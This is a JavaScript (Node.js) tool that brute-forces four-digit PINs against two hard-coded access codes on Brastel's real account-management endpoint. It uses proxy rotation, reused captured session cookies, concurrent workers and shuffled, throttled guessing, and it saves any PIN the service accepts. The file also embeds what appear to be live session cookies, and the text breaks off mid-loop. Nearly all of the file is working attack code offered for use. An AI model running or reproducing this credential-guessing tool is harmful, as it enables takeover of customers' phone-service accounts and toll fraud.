/**
 * Brastel PIN Checker - Enhanced Refactored Version
 * A modular PIN checking system with proxy rotation and concurrent workers
 */

require('dotenv').config();

const axios = require('axios');
const qs = require('qs');
const fsSync = require('fs');
const path = require('path');
const { HttpsProxyAgent } = require('https-proxy-agent');

/**
 * Constants and enums
 */
const LOG_LEVELS = {
  INFO: 'INFO',
  ERROR: 'ERROR',
  SUCCESS: 'SUCCESS',
  WARNING: 'WARNING',
  PROXY: 'PROXY',
  FOUND: 'FOUND',
  SKIP: 'SKIP'
};

const EMOJIS = {
  [LOG_LEVELS.INFO]: '🔍',
  [LOG_LEVELS.ERROR]: '❌',
  [LOG_LEVELS.SUCCESS]: '✅',
  [LOG_LEVELS.WARNING]: '⚠️',
  [LOG_LEVELS.PROXY]: '🛡️',
  [LOG_LEVELS.FOUND]: '🎯',
  [LOG_LEVELS.SKIP]: '⏭️'
};

const API_RESULT_CODES = {
  SUCCESS: '0',
  NOT_FOUND: '100'
};

const FILE_NAMES = {
  SENT_PINS: 'sent_pins_history.json',
  BLACKLIST_PINS: 'blacklist_pins.json',
  VALID_PINS: 'valid_pins_found.json'
};

/**
 * Configuration object containing all settings
 */
const CONFIG = {
  // Multiple accessCodes configuration
  accessCodes: [
    {
      accessCode: '74974423',
      pinRange: {
        start: 5410,
        end: 9999
      }
    },
    {
      accessCode: '33849108',
      pinRange: {
        start: 0,
        end: 9999
      }
    }
  ],

  // Worker configuration with environment variable support
  concurrentWorkers: parseInt(process.env.CONCURRENT_WORKERS) || 1,
  maxRetries: parseInt(process.env.MAX_RETRIES) || 10,
  retryDelay: parseInt(process.env.RETRY_DELAY) || 3000,
  proxyRotationInterval: parseInt(process.env.PROXY_ROTATION_INTERVAL) || 250000, // 250 seconds
  requestTimeout: parseInt(process.env.REQUEST_TIMEOUT) || 60000,
  maxUndefinedResults: parseInt(process.env.MAX_UNDEFINED_RESULTS) || 25, // Stop program if undefined results exceed this

  // Random processing configuration
  randomProcessing: {
    enabled: process.env.RANDOM_PROCESSING === 'true' || true, // Set to true to enable random PIN selection (shuffle mode), false for sequential
    delayBetweenPins: parseInt(process.env.DELAY_BETWEEN_PINS) || 100 // Delay in ms between PIN processing
  },

  // Folder paths
  folders: {
    logs: process.env.LOG_FOLDER || 'Log',
    data: process.env.DATA_FOLDER || 'Data'
  },

  // File paths for tracking (will be dynamically generated based on accessCode)
  getFilePaths(accessCode) {
    const accessCodeFolder = path.join(this.folders.data, accessCode);
    return {
      folder: accessCodeFolder,
      sentPins: path.join(accessCodeFolder, FILE_NAMES.SENT_PINS),
      blacklistPins: path.join(accessCodeFolder, FILE_NAMES.BLACKLIST_PINS),
      validPins: path.join(accessCodeFolder, FILE_NAMES.VALID_PINS)
    };
  },

  // API endpoints and headers
  api: {
    url: process.env.API_URL || 'https://www.brastel.com/web/WIMS/Manager.aspx',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Accept': 'application/json, text/javascript, */*; q=0.01',
      'User-Agent': process.env.USER_AGENT || 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
      'X-Requested-With': 'XMLHttpRequest',
      'Referer': process.env.REFERER || 'https://www.brastel.com/myaccount/m/password/eng',
      'Origin': process.env.ORIGIN || 'https://www.brastel.com',
      'Accept-Encoding': 'gzip, deflate, br, zstd',
      'Accept-Language': 'en-US,en;q=0.9',
      'Connection': 'keep-alive'
    }
  },

  // Static proxy list (can be overridden by PROXY_LIST environment variable)
  proxies: (process.env.PROXY_LIST ? process.env.PROXY_LIST.split(',') : [
    '',
    '',
    ''
  ]),

  // Cookie configurations (can be overridden by COOKIE_LIST environment variable)
  cookies: (process.env.COOKIE_LIST ? process.env.COOKIE_LIST.split('|') : [
    '_ga=GA1.2.2004863075.1749788627; ASP.NET_SessionId=kkmvt2y4ni0d4bp1sg0vz3xf; AWSELB=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9F2459D1D823108D586FB065E7B5F9002AD22EB5161F2C7AB3014A70051CE4FA39D6AA5C0E88A842A861D33DC4EA44715; AWSELBCORS=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9F2459D1D823108D586FB065E7B5F9002AD22EB5161F2B7AB3014A70051CE4FA39D6AA5C0E88A842A861D33DC4EA44715; _gid=GA1.2.756149190.1750037918; ASPSESSIONIDCQDCDADQ=EMMPDBIDOPDCKJKJCDCMKLBJ; _gat=1',
    'ASPSESSIONIDCQDCDADQ=FMMPDBIDMJCOKDIBPHJPDCOP; AWSELB=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9630A4EB55147521A4CC93077CC30C2F8ED0CDD21FDE9E146F00EB73527DB00B97FD4E580278805751D3836308F6F276B; AWSELBCORS=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9630A4EB55147521A4CC93077CC30C2F8ED0CDD21FDE9E146F00EB73527DB00B97FD4E580278805751D3836308F6F276B; ASP.NET_SessionId=jdjtcrz3ldwqknn0la2hglta; _ga=GA1.2.1880294636.1750065908; _gid=GA1.2.166709486.1750065908; _gat=1',
    'ASPSESSIONIDCQDCDADQ=FMMPDBIDMJCOKDIBPHJPDCOP; AWSELB=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9630A4EB55147521A4CC93077CC30C2F8ED0CDD21FDE9E146F00EB73527DB00B97FD4E580278805751D3836308F6F276B; AWSELBCORS=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9630A4EB55147521A4CC93077CC30C2F8ED0CDD21FDE9E146F00EB73527DB00B97FD4E580278805751D3836308F6F276B; ASP.NET_SessionId=jdjtcrz3ldwqknn0la2hglta; _ga=GA1.2.1880294636.1750065908; _gid=GA1.2.166709486.1750065908; _gat=1; signInLangTrackEvent=50250189300514'
  ])
};

/**
 * Utility functions
 */
class Utils {
  /**
   * Format PIN with leading zeros
   * @param {number} pin - PIN number
   * @returns {string} Formatted PIN
   */
  static formatPin(pin) {
    return pin.toString().padStart(4, '0');
  }

  /**
   * Create directory if it doesn't exist
   * @param {string} dirPath - Directory path
   */
  static ensureDirectoryExists(dirPath) {
    if (!fsSync.existsSync(dirPath)) {
      fsSync.mkdirSync(dirPath, { recursive: true });
      return true;
    }
    return false;
  }

  /**
   * Delay execution
   * @param {number} ms - Milliseconds to delay
   */
  static delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  /**
   * Generate array of numbers in range
   * @param {number} start - Start number
   * @param {number} end - End number
   * @returns {Array<number>} Array of numbers
   */
  static generateRange(start, end) {
    return Array.from({ length: end - start + 1 }, (_, i) => start + i);
  }

  /**
   * Split array into chunks
   * @param {Array} array - Array to split
   * @param {number} chunkSize - Size of each chunk
   * @returns {Array<Array>} Array of chunks
   */
  static chunkArray(array, chunkSize) {
    const chunks = [];
    for (let i = 0; i < array.length; i += chunkSize) {
      chunks.push(array.slice(i, i + chunkSize));
    }
    return chunks;
  }

  /**
   * Shuffle array using Fisher-Yates algorithm
   * @param {Array} array - Array to shuffle
   * @returns {Array} Shuffled array (new array, doesn't modify original)
   */
  static shuffleArray(array) {
    const shuffled = [...array]; // Create a copy
    for (let i = shuffled.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
    }
    return shuffled;
  }


}

/**
 * File Manager class for handling PIN tracking files
 */
class FileManager {
  constructor(logger, accessCode) {
    this.logger = logger;
    this.accessCode = accessCode;
    this.filePaths = CONFIG.getFilePaths(accessCode);
    this.cache = new Map(); // Cache for frequently accessed data
    this.initialize();
  }

  /**
   * Initialize file system and cache
   */
  initialize() {
    this.ensureFoldersExist();
    this.ensureFilesExist();
    this.loadCache();
  }

  /**
   * Ensure all required folders exist
   */
  ensureFoldersExist() {
    // Create main folders
    Object.values(CONFIG.folders).forEach(folderPath => {
      if (Utils.ensureDirectoryExists(folderPath)) {
        this.logger.info(`Created folder: ${folderPath}`);
      }
    });

    // Create accessCode specific folder
    if (Utils.ensureDirectoryExists(this.filePaths.folder)) {
      this.logger.info(`Created accessCode folder: ${this.filePaths.folder}`);
    }
  }

  /**
   * Ensure all tracking files exist
   */
  ensureFilesExist() {
    const filesToCreate = [
      this.filePaths.sentPins,
      this.filePaths.blacklistPins,
      this.filePaths.validPins
    ];

    filesToCreate.forEach(filepath => {
      if (!fsSync.existsSync(filepath)) {
        this.writeJsonFileSync(filepath, []);
        this.logger.info(`Created tracking file for ${this.accessCode}: ${filepath}`);
      }
    });
  }

  /**
   * Load data into cache
   */
  loadCache() {
    try {
      this.cache.set('sentPins', new Set(this.readJsonFileSync(this.filePaths.sentPins)));
      this.cache.set('blacklistPins', new Set(this.readJsonFileSync(this.filePaths.blacklistPins)));
    } catch (error) {
      this.logger.error(`Error loading cache: ${error.message}`);
    }
  }

  /**
   * Read JSON file safely (synchronous)
   * @param {string} filename - File to read
   * @returns {Array} Array data from file
   */
  readJsonFileSync(filename) {
    try {
      const data = fsSync.readFileSync(filename, 'utf8');
      return JSON.parse(data) || [];
    } catch (error) {
      this.logger.warning(`Error reading ${filename}: ${error.message}`);
      return [];
    }
  }

  /**
   * Write JSON file safely (synchronous)
   * @param {string} filename - File to write
   * @param {Array} data - Data to write
   */
  writeJsonFileSync(filename, data) {
    try {
      fsSync.writeFileSync(filename, JSON.stringify(data, null, 2));
    } catch (error) {
      this.logger.error(`Error writing ${filename}: ${error.message}`);
    }
  }

  /**
   * Check if PIN was already sent (using cache)
   * @param {string} pin - PIN to check
   * @returns {boolean} True if already sent
   */
  isPinSent(pin) {
    return this.cache.get('sentPins')?.has(pin) || false;
  }

  /**
   * Add PIN to sent history
   * @param {string} pin - PIN to add
   */
  addSentPin(pin) {
    const sentPinsSet = this.cache.get('sentPins');
    if (!sentPinsSet.has(pin)) {
      sentPinsSet.add(pin);
      const sentPinsArray = Array.from(sentPinsSet);
      this.writeJsonFileSync(this.filePaths.sentPins, sentPinsArray);
    }
  }

  /**
   * Get all sent PINs
   * @returns {Array} Array of sent PINs
   */
  getSentPins() {
    return Array.from(this.cache.get('sentPins') || []);
  }

  /**
   * Check if PIN is blacklisted (using cache)
   * @param {string} pin - PIN to check
   * @returns {boolean} True if blacklisted
   */
  isBlacklisted(pin) {
    return this.cache.get('blacklistPins')?.has(pin) || false;
  }

  /**
   * Add PIN to blacklist
   * @param {string} pin - PIN to blacklist
   */
  addBlacklistPin(pin) {
    const blacklistSet = this.cache.get('blacklistPins');
    if (!blacklistSet.has(pin)) {
      blacklistSet.add(pin);
      const blacklistArray = Array.from(blacklistSet);
      this.writeJsonFileSync(this.filePaths.blacklistPins, blacklistArray);
      this.logger.warning(`Added PIN ${pin} to blacklist for ${this.accessCode}`);
    }
  }

  /**
   * Get all blacklisted PINs
   * @returns {Array} Array of blacklisted PINs
   */
  getBlacklistPins() {
    return Array.from(this.cache.get('blacklistPins') || []);
  }

  /**
   * Add valid PIN to results
   * @param {string} pin - Valid PIN found
   */
  addValidPin(pin) {
    const validPins = this.readJsonFileSync(this.filePaths.validPins);
    const entry = {
      pin,
      accessCode: this.accessCode,
      timestamp: new Date().toISOString()
    };
    validPins.push(entry);
    this.writeJsonFileSync(this.filePaths.validPins, validPins);
    this.logger.found(`Saved valid PIN for ${this.accessCode} to file: ${pin}`);
  }

  /**
   * Get valid PINs
   * @returns {Array} Array of valid PINs
   */
  getValidPins() {
    return this.readJsonFileSync(this.filePaths.validPins);
  }

  /**
   * Get statistics
   * @returns {Object} Statistics object
   */
  /**
   * Check if there are any valid PINs that are not blacklisted
   * @returns {boolean} True if there are valid non-blacklisted PINs
   */
  hasValidNonBlacklistedPins() {
    const validPins = this.getValidPins();
    if (validPins.length === 0) {
      return false;
    }

    // Check if any valid PIN is not in blacklist
    return validPins.some(validPin => {
      return !this.isBlacklisted(validPin.pin);
    });
  }

  /**
   * Get valid PINs that are not blacklisted
   * @returns {Array} Array of valid non-blacklisted PINs
   */
  getValidNonBlacklistedPins() {
    const validPins = this.getValidPins();
    return validPins.filter(validPin => {
      return !this.isBlacklisted(validPin.pin);
    });
  }

  getStatistics() {
    const validNonBlacklisted = this.getValidNonBlacklistedPins();
    return {
      sentPinsCount: this.cache.get('sentPins')?.size || 0,
      blacklistPinsCount: this.cache.get('blacklistPins')?.size || 0,
      validPinsCount: this.getValidPins().length,
      validNonBlacklistedCount: validNonBlacklisted.length,
      blacklistedPins: this.getBlacklistPins(),
      validPins: this.getValidPins(),
      validNonBlacklistedPins: validNonBlacklisted
    };
  }
}

/**
 * Logger class for handling all logging operations
 */
class Logger {
  constructor(accessCode) {
    this.accessCode = accessCode;
    this.logFile = path.join(CONFIG.folders.logs, `log_${accessCode}.txt`);
    this.initialize();
  }

  /**
   * Initialize logger
   */
  initialize() {
    Utils.ensureDirectoryExists(CONFIG.folders.logs);
  }

  /**
   * Log a message to both console and file
   * @param {string} message - Message to log
   * @param {string} level - Log level
   */
  log(message, level = LOG_LEVELS.INFO) {
    const timestamp = new Date().toISOString();
    const emoji = EMOJIS[level] || '📝';
    const fullMessage = `[${timestamp}] ${emoji} [${this.accessCode}] ${message}`;

    // console.log(fullMessage);
    fsSync.appendFileSync(this.logFile, `${fullMessage}\n`);
  }

  // Convenience methods
  info(message) { this.log(message, LOG_LEVELS.INFO); }
  error(message) { this.log(message, LOG_LEVELS.ERROR); }
  success(message) { this.log(message, LOG_LEVELS.SUCCESS); }
  warning(message) { this.log(message, LOG_LEVELS.WARNING); }
  proxy(message) { this.log(message, LOG_LEVELS.PROXY); }
  found(message) { this.log(message, LOG_LEVELS.FOUND); }
  skip(message) { this.log(message, LOG_LEVELS.SKIP); }
}

/**
 * Proxy Manager class for handling proxy operations
 */
class ProxyManager {
  constructor(logger) {
    this.logger = logger;
  }

  /**
   * Create proxy agent from static proxy URL
   * @param {string} proxyUrl - Static proxy URL
   * @returns {Object|null} Proxy agent or null
   */
  createStaticProxy(proxyUrl) {
    if (!proxyUrl) return null;
    try {
      return new HttpsProxyAgent(proxyUrl);
    } catch (error) {
      this.logger.error(`Failed to create proxy agent: ${error.message}`);
      return null;
    }
  }
}

/**
 * API Request class for handling HTTP requests
 */
class ApiRequest {
  constructor(logger, proxyManager) {
    this.logger = logger;
    this.proxyManager = proxyManager;
  }

  /**
   * Create request configuration
   * @param {Object} agent - Proxy agent
   * @param {string} cookie - Cookie string
   * @returns {Object} Request configuration
   */
  createRequestConfig(agent, cookie) {
    const config = {
      headers: {
        ...CONFIG.api.headers,
        'Cookie': cookie
      },
      proxy: false,
      timeout: CONFIG.requestTimeout
    };

    if (agent) {
      config.httpsAgent = agent;
    }

    return config;
  }

  /**
   * Create request data
   * @param {string} accessCode - Access code
   * @param {string} pin - PIN to check
   * @returns {Object} Request data
   */
  createRequestData(accessCode, pin) {
    return {
      xslFile: 'ajax_sip_050_activation.xsl',
      action: 'ReturnSPCNumber',
      accessCode,
      style: '14',
      service: '1',
      pin
    };
  }

  /**
   * Make API request
   * @param {string} accessCode - Access code
   * @param {string} pin - PIN to check
   * @param {Object} agent - Proxy agent
   * @param {string} cookie - Cookie string
   * @returns {Promise<Object>} Response data
   */
  async makeRequest(accessCode, pin, agent, cookie) {
    const requestConfig = this.createRequestConfig(agent, cookie);
    const data = this.createRequestData(accessCode, pin);

    const response = await axios.post(CONFIG.api.url, qs.stringify(data), requestConfig);
    return response.data;
  }
}

/**
 * PIN Checker class for handling PIN validation requests
 */
class PinChecker {
  constructor(logger, proxyManager, fileManager, accessCode) {
    this.logger = logger;
    this.proxyManager = proxyManager;
    this.fileManager = fileManager;
    this.accessCode = accessCode;
    this.apiRequest = new ApiRequest(logger, proxyManager);
    this.found = false;
    this.undefinedCount = 0; // Per-worker undefined counter
    this.shouldStopWorker = false; // Per-worker stop flag
  }

  /**
   * Check if should stop processing
   * @returns {boolean} True if should stop
   */
  shouldStop() {
    return this.found || this.shouldStopWorker;
  }

  /**
   * Reset undefined counter when getting valid results
   */
  resetUndefinedCount() {
    this.undefinedCount = 0;
  }

  /**
   * Handle undefined result
   * @param {string} pin - PIN being checked
   * @param {number} workerId - Worker ID
   * @returns {boolean} True if should stop this worker
   */
  handleUndefinedResult(pin, workerId) {
    this.undefinedCount++;
    this.logger.warning(`Worker ${workerId} - Error checking PIN ${pin} (Worker undefined count: ${this.undefinedCount}/${CONFIG.maxUndefinedResults})`);

    if (this.undefinedCount >= CONFIG.maxUndefinedResults) {
      this.shouldStopWorker = true;
      this.logger.error(`Worker ${workerId} - Undefined results limit exceeded (${this.undefinedCount}/${CONFIG.maxUndefinedResults}). Stopping this worker only.`);
      return true;
    }
    return false;
  }

  /**
   * Process API result
   * @param {Object} result - API response
   * @param {string} pin - PIN being checked
   * @param {number} workerId - Worker ID
   * @param {string} additionalInfo - Additional logging information (optional)
   * @returns {boolean} True if PIN is valid
   */
  processResult(result, pin, workerId, additionalInfo = '') {
    const logMessage = `Worker ${workerId} - PIN: ${pin} | Result: ${result.result} - ${result.errorMsg}`;
    const fullMessage = additionalInfo ? `${logMessage} | ${additionalInfo}` : logMessage;

    this.logger.info(fullMessage);

    // Reset undefined counter since we got a valid response
    this.resetUndefinedCount();

    if (result.result === API_RESULT_CODES.SUCCESS) {
      // Check if this PIN is blacklisted
      if (this.fileManager.isBlacklisted(pin)) {
        this.logger.warning(`Worker ${workerId} - PIN ${pin} is blacklisted but returned success. Continuing...`);
        return false; // Continue processing instead of stopping
      }

      // Valid PIN found
      this.logger.found(`Worker ${workerId} - FOUND VALID PIN: ${pin}`);
      this.fileManager.addValidPin(pin);
      this.found = true;
      return true;
    }

    return false; // PIN is invalid or other result
  }

  /**
   * Check a single PIN
   * @param {string} pin - PIN to check
   * @param {Object} agent - Proxy agent
   * @param {string} cookie - Cookie string
   * @param {number} workerId - Worker ID
   * @param {string} additionalInfo - Additional logging information (optional)
   * @returns {Promise<boolean>} True if PIN is valid
   */
  async checkPin(pin, agent, cookie, workerId, additionalInfo = '') {
    for (let attempt = 1; attempt <= CONFIG.maxRetries; attempt++) {
      if (this.shouldStop()) return false;

      try {
        const result = await this.apiRequest.makeRequest(this.accessCode, pin, agent, cookie);

        if (result.result === undefined) {
          if (this.handleUndefinedResult(pin, workerId)) {
            return false;
          }
          await Utils.delay(CONFIG.retryDelay);
          continue;
        }

        // Mark PIN as sent
        this.fileManager.addSentPin(pin);
        return this.processResult(result, pin, workerId, additionalInfo);

      } catch (error) {
        this.logger.error(`Worker ${workerId} - Error checking PIN ${pin} (attempt ${attempt}): ${error.message}`);
        if (attempt < CONFIG.maxRetries) {
          await Utils.delay(CONFIG.retryDelay);
        }
      }
    }
    return false;
  }
}

/**
 * Worker class for processing PINs
 */
class Worker {
  constructor(id, logger, proxyManager, pinChecker, fileManager) {
    this.id = id;
    this.logger = logger;
    this.proxyManager = proxyManager;
    this.pinChecker = pinChecker;
    this.fileManager = fileManager;
  }

  /**
   * Get available PINs (full range minus already sent PINs)
   * @param {number} start - Start range
   * @param {number} end - End range
   * @returns {Array<string>} Array of available formatted PINs
   */
  getAvailablePins(start, end) {
    // Generate full range
    const fullRange = Utils.generateRange(start, end);

    // Filter out already sent PINs
    const availablePins = fullRange
      .map(pin => Utils.formatPin(pin))
      .filter(formattedPin => {
        if (this.fileManager.isPinSent(formattedPin)) {
          return false;
        }
        return true;
      });

    this.logger.info(`Worker ${this.id} - Full range: ${fullRange.length} PINs, Available: ${availablePins.length} PINs`);
    return availablePins;
  }

  /**
   * Process available PINs directly (new method)
   * @param {Array<string>} availablePins - Array of available formatted PINs
   * @param {string} cookie - Cookie string
   * @param {string} staticProxy - Static proxy URL
   */
  async processAvailablePins(availablePins, cookie, staticProxy) {
    const agent = this.proxyManager.createStaticProxy(staticProxy);

    this.logger.info(`Worker ${this.id} - Processing ${availablePins.length} available PINs`);

    if (availablePins.length === 0) {
      this.logger.warning(`Worker ${this.id} - No available PINs to process`);
      return;
    }

    // Choose processing mode based on configuration
    if (CONFIG.randomProcessing.enabled) {
      this.logger.info(`Worker ${this.id} - Using random shuffle processing mode`);
      await this.processWithShuffle(availablePins, agent, cookie);
    } else {
      this.logger.info(`Worker ${this.id} - Using sequential processing mode`);
      await this.processSequentially(availablePins, agent, cookie);
    }
  }

  /**
   * Process a list of PINs (either sequentially or with shuffle random selection)
   * @param {Array<number>} pins - Array of PINs to check (will be ignored, using range instead)
   * @param {string} cookie - Cookie string
   * @param {string} staticProxy - Static proxy URL
   * @param {Object} pinRange - Pin range object with start and end
   */
  async process(pins, cookie, staticProxy, pinRange = null) {
    const agent = this.proxyManager.createStaticProxy(staticProxy);

    // If pinRange is provided, use it to get available PINs
    let availablePins;
    if (pinRange) {
      availablePins = this.getAvailablePins(pinRange.start, pinRange.end);
    } else {
      // Fallback to old method for backward compatibility
      availablePins = this.filterUnsentPins(pins);
    }

    this.logger.info(`Worker ${this.id} - Total available PINs to process: ${availablePins.length}`);

    if (availablePins.length === 0) {
      this.logger.warning(`Worker ${this.id} - No available PINs to process`);
      return;
    }

    // Choose processing mode based on configuration
    if (CONFIG.randomProcessing.enabled) {
      this.logger.info(`Worker ${this.id} - Using random shuffle processing mode`);
      await this.processWithShuffle(availablePins, agent, cookie);
    } else {
      this.logger.info(`Worker ${this.id} - Using sequential processing mode`);
      await this.processSequentially(availablePins, agent, cookie);
    }
  }

  /**
   * Filter out already sent PINs (kept for backward compatibility)
   * @param {Array<number>} pins - Array of PINs to check
   * @returns {Array<string>} Array of unsent formatted PINs
   */
  filterUnsentPins(pins) {
    return pins
      .map(pin => Utils.formatPin(pin))
      .filter(formattedPin => {
        if (this.fileManager.isPinSent(formattedPin)) {
          this.logger.skip(`Worker ${this.id} - Skipping already sent PIN: ${formattedPin}`);
          return false;
        }
        return true;
      });
  }

  /**
   * Process PINs sequentially (original method)
   * @param {Array<string>} unsentPins - Array of unsent formatted PINs
   * @param {*} agent - Proxy agent
   * @param {string} cookie - Cookie string
   */
  async processSequentially(unsentPins, agent, cookie) {
    for (let i = 0; i < unsentPins.length; i++) {
      const pin = unsentPins[i];

      if (this.pinChecker.shouldStop()) {
        this.logger.warning(`Worker ${this.id} - Stopping due to shouldStop() condition`);
        return;
      }
      const progressInfo = `Progress: ${i + 1}/${unsentPins.length}`;
      await this.pinChecker.checkPin(pin, agent, cookie, this.id, progressInfo);
    }
    this.logger.info(`Worker ${this.id} - Completed sequential processing`);
  }

  /**
   * Process PINs with random shuffle selection
   * @param {Array<string>} unsentPins - Array of unsent formatted PINs
   * @param {*} agent - Proxy agent
   * @param {string} cookie - Cookie string
   */
  async processWithShuffle(unsentPins, agent, cookie) {
    // Shuffle the unsent pins array for random processing
    const shuffledPins = Utils.shuffleArray(unsentPins);

    this.logger.info(`Worker ${this.id} - Processing ${shuffledPins.length} PINs in random order`);

    // Process pins one by one in random order
    for (let i = 0; i < shuffledPins.length; i++) {
      const pin = shuffledPins[i];

      if (this.pinChecker.shouldStop()) {
        this.logger.warning(`Worker ${this.id} - Stopping due to shouldStop() condition`);
        return;
      }

      // Add a small delay between random selections
      if (i > 0) {
        await Utils.delay(CONFIG.randomProcessing.delayBetweenPins);
      }

      const progressInfo = `Progress: ${i + 1}/${shuffledPins.length}`;
      await this.pinChecker.checkPin(pin, agent, cookie, this.id, progressInfo);
    }

    this.logger.success(`Worker ${this.id} - Completed random shuffle processing of all ${shuffledPins.length} PINs`);
  }
}

/**
 * Single Access Code Checker - handles one accessCode
 */
class SingleAccessCodeChecker {
  constructor(accessCodeConfig) {
    this.accessCode = accessCodeConfig.accessCode;
    this.pinRange = accessCodeConfig.pinRange;
    this.logger = new Logger(this.accessCode);
    this.fileManager = new FileManager(this.logger, this.accessCode);
    this.proxyManager = new ProxyManager(this.logger);
    this.pinChecker = new PinChecker(this.logger, this.proxyManager, this.fileManager, this.accessCode);
  }

  /**
   * Get available PINs (full range minus already sent PINs)
   * @returns {Array<string>} Array of available formatted PINs
   */
  getAvailablePins() {
    const fullRange = Utils.generateRange(this.pinRange.start, this.pinRange.end);
    const availablePins = fullRange
      .map(pin => Utils.formatPin(pin))
      .filter(formattedPin => !this.fileManager.isPinSent(formattedPin));

    this.logger.info(`Access Code ${this.accessCode} - Full range: ${fullRange.length} PINs, Available: ${availablePins.length} PINs`);
    return availablePins;
  }

  /**
   * Distribute available PINs among workers (instead of distributing full range)
   * @param {Array<string>} availablePins - Array of available formatted PINs
   * @returns {Array<Array<string>>} Array of PIN batches for workers
   */
  distributeAvailablePins(availablePins) {
    const batchSize = Math.ceil(availablePins.length / CONFIG.concurrentWorkers);
    return Utils.chunkArray(availablePins, batchSize);
  }

  /**
   * Generate PIN range for this accessCode
   * @returns {Array<number>} Array of PINs to check
   */
  generatePinRange() {
    return Utils.generateRange(this.pinRange.start, this.pinRange.end);
  }

  /**
   * Distribute PINs among workers (old method - kept for compatibility)
   * @param {Array<number>} pins - Array of PINs
   * @returns {Array<Array<number>>} Array of PIN batches for workers
   */
  distributePins(pins) {
    const batchSize = Math.ceil(pins.length / CONFIG.concurrentWorkers);
    return Utils.chunkArray(pins, batchSize);
  }

  /**
   * Display statistics for this accessCode
   */
  displayStats() {
    const stats = this.fileManager.getStatistics();

    this.logger.info('=== STATISTICS ===');
    this.logger.info(`Access Code: ${this.accessCode}`);
    this.logger.info(`PIN Range: ${this.pinRange.start} - ${this.pinRange.end}`);
    this.logger.info(`Total PINs sent: ${stats.sentPinsCount}`);
    this.logger.info(`Blacklisted PINs: ${stats.blacklistPinsCount}`);
    this.logger.info(`Valid PINs found: ${stats.validPinsCount}`);
    this.logger.info(`Valid PINs (not blacklisted): ${stats.validNonBlacklistedCount}`);

    if (stats.blacklistedPins.length > 0) {
      this.logger.info(`Blacklisted: ${stats.blacklistedPins.join(', ')}`);
    }

    if (stats.validPins.length > 0) {
      this.logger.success(`All Valid PINs: ${stats.validPins.map(p => p.pin).join(', ')}`);
    }

    if (stats.validNonBlacklistedPins.length > 0) {
      this.logger.found(`Valid PINs (not blacklisted): ${stats.validNonBlacklistedPins.map(p => p.pin).join(', ')}`);
    }

    this.logger.info('Files location:');
    this.logger.info(`- Sent PINs: ${this.fileManager.filePaths.sentPins}`);
    this.logger.info(`- Blacklist: ${this.fileManager.filePaths.blacklistPins}`);
    this.logger.info(`- Valid PINs: ${this.fileManager.filePaths.validPins}`);
  }

  /**
   * Create workers with new available PINs distribution
   * @param {Array<string>} availablePins - Available formatted PINs
   * @returns {Array<Promise>} Array of worker promises
   */
  createWorkersWithAvailablePins(availablePins) {
    const pinBatches = this.distributeAvailablePins(availablePins);
    const workers = [];

    for (let i = 0; i < CONFIG.concurrentWorkers; i++) {
      // Create a separate PinChecker instance for each worker to avoid shared state
      const workerPinChecker = new PinChecker(this.logger, this.proxyManager, this.fileManager, this.accessCode);

      // Share the 'found' state from the main pinChecker so all workers can see when to stop
      Object.defineProperty(workerPinChecker, 'found', {
        get: () => this.pinChecker.found,
        set: (value) => { this.pinChecker.found = value; }
      });

      const worker = new Worker(i + 1, this.logger, this.proxyManager, workerPinChecker, this.fileManager);
      const cookie = CONFIG.cookies[i] || CONFIG.cookies[0]; // Fallback to first cookie
      const staticProxy = CONFIG.proxies[i] || ''; // Fallback to unused proxy

      // Pass available PINs directly to worker (using old method signature for now)
      workers.push(worker.processAvailablePins(pinBatches[i] || [], cookie, staticProxy));
    }

    return workers;
  }

  /**
   * Create workers (old method - kept for compatibility)
   * @param {Array<Array<number>>} pinBatches - PIN batches for workers
   * @returns {Array<Promise>} Array of worker promises
   */
  createWorkers(pinBatches) {
    const workers = [];

    for (let i = 0; i < CONFIG.concurrentWorkers; i++) {
      // Create a separate PinChecker instance for each worker to avoid shared state
      const workerPinChecker = new PinChecker(this.logger, this.proxyManager, this.fileManager, this.accessCode);

      // Share the 'found' state from the main pinChecker so all workers can see when to stop
      Object.defineProperty(workerPinChecker, 'found', {
        get: () => this.pinChecker.found,
        set: (value) => { this.pinChecker.found = value; }
      });

      const worker = new Worker(i + 1, this.logger, this.proxyManager, workerPinChecker, this.fileManager);
      const cookie = CONFIG.cookies[i] || CONFIG.cookies[0]; // Fallback to first cookie
      const staticProxy = CONFIG.proxies[i] || ''; // Fallback to unused proxy

      workers.push(worker.process(pinBatches[i] || [], cookie, staticProxy, this.pinRange));
    }

    return workers;
  }

  /**
   * Start the PIN checking process for this accessCode
   * @returns {Promise<boolean>} True if should continue to next accessCode
   */
  async start() {
    this.logger.info(`Starting PIN Checker for AccessCode: ${this.accessCode}`);
    this.logger.info(`PIN Range: ${this.pinRange.start} - ${this.pinRange.end}`);
    this.logger.info(`Concurrent Workers: ${CONFIG.concurrentWorkers}`);

    // Display current statistics
    this.displayStats();

    // Check if we already have valid non-blacklisted PINs
    if (this.fileManager.hasValidNonBlacklistedPins()) {
      const validPins = this.fileManager.getValidNonBlacklistedPins();
      this.logger.success(`AccessCode ${this.accessCode} already has valid PIN(s): ${validPins.map(p => p.pin).join(', ')}`);
      this.logger.info('These PINs are not blacklisted, so processing is complete for this accessCode.');
      this.logger.info('If you want to continue searching, add these PINs to blacklist_pins.json');

      // Mark as found to stop any further processing
      this.pinChecker.found = true;

      return true; // Continue to next accessCode
    }

    // Use new logic: get available PINs first, then distribute among workers
    const availablePins = this.getAvailablePins();

    if (availablePins.length === 0) {
      this.logger.warning(`No available PINs to process for AccessCode: ${this.accessCode}`);
      return true; // Continue to next accessCode
    }

    // Distribute available PINs among workers and create workers
    const pinBatches = this.distributeAvailablePins(availablePins);
    const workers = [];

    for (let i = 0; i < CONFIG.concurrentWorkers; i++) {
      // Create a separate PinChecker instance for each worker to avoid shared state
